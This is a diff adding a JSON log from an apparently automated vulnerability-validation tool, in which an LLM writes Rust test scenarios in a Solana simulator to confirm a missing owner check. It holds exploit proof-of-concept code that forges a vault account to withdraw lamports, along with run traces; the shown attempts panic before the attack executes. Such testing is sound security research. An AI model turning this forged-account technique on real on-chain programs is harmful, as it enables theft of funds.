+                "head": "0000000000000000",
+                "digest": "c1249ee2fe021860",
+                "post": "0000000000000000000000000000000200000000000000000000000000000000000000000000000020a1070000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "thread 'scenario' (33817) panicked at /home/tcc/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/mollusk-svm-error-0.0.12/src/error.rs:44:32:     [MOLLUSK]: An account required by the instruction was not provided: 11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 391 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o cenario entrou em panico antes do ataque: thread 'scenario' (33817) panicked at /home/tcc/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/mollusk-svm-error-0.0.12/src/error.rs:44:32:     [MOLLUSK]: An account required by the instruction was not provided: 11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP"
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3575,
+        "completion_tokens": 967,
+        "latency_s": 4.93
+      },
+      "raw": "{\"plan\": \"O erro indica que o Mollusk exige a conta do System Program (11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP) porque o harness provavelmente injeta o system program quando ha transferencia de lamports via borrow_mut_lamports_unchecked. Vou incluir system_program_account() nas contas e nos metas. O baseline usa uma vault legitima com authority correta; o ataque usa uma vault forjada com dono diferente do programa, contendo a authority do atacante e saldo alto, demonstrando que o programa aceita dados forjados sem checar owner.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\nlet (system_key, system_acc) = system_program_account();\\n\\n// Conta vault legitima: dados = [8 bytes prefixo] + authority (32) + saldo (8)\\nlet mut vault_data = vec![0u8; 48];\\nvault_data[8..40].copy_from_slice(authority.as_ref());\\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_legit_key = Pubkey::new_unique();\\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\\n\\nlet authority_acc = wallet(1_000_000);\\nlet recipient_acc = wallet(1_000_000);\\n\\nlet amount: u64 = 500_000;\\nlet mut ix_data = vec![1u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\nlet metas = vec![\\n    AccountMeta::new(vault_legit_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n    AccountMeta::new_readonly(system_key, false),\\n];\\n\\n// Baseline: vault real, authority correta\\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\\nlet contas_baseline = vec![\\n    (vault_legit_key, vault_legit),\\n    (authority, authority_acc),\\n    (recipient, recipient_acc),\\n    (system_key, system_acc),\\n];\\nlet _r_base = env.baseline(\\\"withdraw legitimo\\\", &ix_baseline, &contas_baseline);\\n\\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\\nlet vault_forged_key = Pubkey::new_unique();\\nlet mut forged_data = vec![0u8; 48];\\nforged_data[8..40].copy_from_slice(authority.as_ref());\\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\\n\\nlet ix_attack = env.raw_ix(&ix_data, metas);\\nlet contas_attack = vec![\\n    (vault_forged_key, vault_forged),\\n    (authority, wallet(1_000_000)),\\n    (recipient, wallet(1_000_000)),\\n    (system_key, system_program_account().1),\\n];\\nlet r = env.attack(\\\"withdraw com vault forjada\\\", &ix_attack, &contas_attack);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_forged_key);\\n    let recipient_after = after(&r, &recipient);\\n    env.effect(\\\"vault forjada debitada\\\", vault_after.lamports() == 1_500_000);\\n    env.effect(\\\"recipient creditado\\\", recipient_after.lamports() == 1_500_000);\\n    env.effect(\\\"saldo forjado atualizado\\\", read_u64(vault_after.data(), 40) == 500_000);\\n}\"}",
+      "plan": "O erro indica que o Mollusk exige a conta do System Program (11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP) porque o harness provavelmente injeta o system program quando ha transferencia de lamports via borrow_mut_lamports_unchecked. Vou incluir system_program_account() nas contas e nos metas. O baseline usa uma vault legitima com authority correta; o ataque usa uma vault forjada com dono diferente do programa, contendo a authority do atacante e saldo alto, demonstrando que o programa aceita dados forjados sem checar owner.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\nlet (system_key, system_acc) = system_program_account();\n\n// Conta vault legitima: dados = [8 bytes prefixo] + authority (32) + saldo (8)\nlet mut vault_data = vec![0u8; 48];\nvault_data[8..40].copy_from_slice(authority.as_ref());\nvault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_legit_key = Pubkey::new_unique();\nlet vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));\n\nlet authority_acc = wallet(1_000_000);\nlet recipient_acc = wallet(1_000_000);\n\nlet amount: u64 = 500_000;\nlet mut ix_data = vec![1u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\n\nlet metas = vec![\n    AccountMeta::new(vault_legit_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n    AccountMeta::new_readonly(system_key, false),\n];\n\n// Baseline: vault real, authority correta\nlet ix_baseline = env.raw_ix(&ix_data, metas.clone());\nlet contas_baseline = vec![\n    (vault_legit_key, vault_legit),\n    (authority, authority_acc),\n    (recipient, recipient_acc),\n    (system_key, system_acc),\n];\nlet _r_base = env.baseline(\"withdraw legitimo\", &ix_baseline, &contas_baseline);\n\n// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto\nlet vault_forged_key = Pubkey::new_unique();\nlet mut forged_data = vec![0u8; 48];\nforged_data[8..40].copy_from_slice(authority.as_ref());\nforged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\nlet vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));\n\nlet ix_attack = env.raw_ix(&ix_data, metas);\nlet contas_attack = vec![\n    (vault_forged_key, vault_forged),\n    (authority, wallet(1_000_000)),\n    (recipient, wallet(1_000_000)),\n    (system_key, system_program_account().1),\n];\nlet r = env.attack(\"withdraw com vault forjada\", &ix_attack, &contas_attack);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_forged_key);\n    let recipient_after = after(&r, &recipient);\n    env.effect(\"vault forjada debitada\", vault_after.lamports() == 1_500_000);\n    env.effect(\"recipient creditado\", recipient_after.lamports() == 1_500_000);\n    env.effect(\"saldo forjado atualizado\", read_u64(vault_after.data(), 40) == 500_000);\n}",
+      "run": {
+        "kind": "panic",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "withdraw legitimo",
+            "result": "Success",
+            "compute_units": 438,
+            "account_flags": "-w,sr,-w,-r",
+            "ix_head": "0120a10700000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0000000000000000",
+                "digest": "c1249ee2fe021860",
+                "post": "0000000000000000000000000000000200000000000000000000000000000000000000000000000020a1070000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111111111111111111111111111111",
+                "signer": false,
+                "writable": false,
+                "owner": "NativeLoader1111111111111111111111111111111",
+                "data_len": 14,
+                "head": "73797374656d5f70",
+                "digest": "d8e11c483f20607a",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "detail": "thread 'scenario' (33859) panicked at /home/tcc/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/mollusk-svm-error-0.0.12/src/error.rs:44:32:     [MOLLUSK]: An account required by the instruction was not provided: 11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 438 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o cenario entrou em panico antes do ataque: thread 'scenario' (33859) panicked at /home/tcc/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/mollusk-svm-error-0.0.12/src/error.rs:44:32:     [MOLLUSK]: An account required by the instruction was not provided: 11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP"
+    }
+  ],
+  "case_id": "SSP-01-P-S",
+  "static_finding": {
+    "category": "OWNER",
+    "confidence": "high",
+    "evidence": "let vault_data = vault.try_borrow_data()?;\nlet stored_authority = read_pubkey(&vault_data[8..40]);",
+    "explanation": "A conta `vault` e recebida como `AccountInfo` e seus dados sao lidos diretamente sem verificar `vault.owner`. Um atacante pode fornecer uma conta forjada cujo campo `owner` aponta para outro programa (ou nenhum), contendo dados arbitrarios que satisfacam a checagem de `stored_authority`, permitindo manipular o saldo lido e a logica de saque.",
+    "attack_hypothesis": "O atacante cria uma conta cujos dados colocam sua propria chave em `vault_data[8..40]` e um saldo alto em `vault_data[40..48]`, e a passa como `vault`. Como nao ha checagem de `owner`, o programa aceita os dados forjados e prossegue com o saque, drenando lamports da conta real de vault (ou de qualquer conta cujos lamports sejam debitados via `borrow_mut_lamports_unchecked`)."
+  }
+}
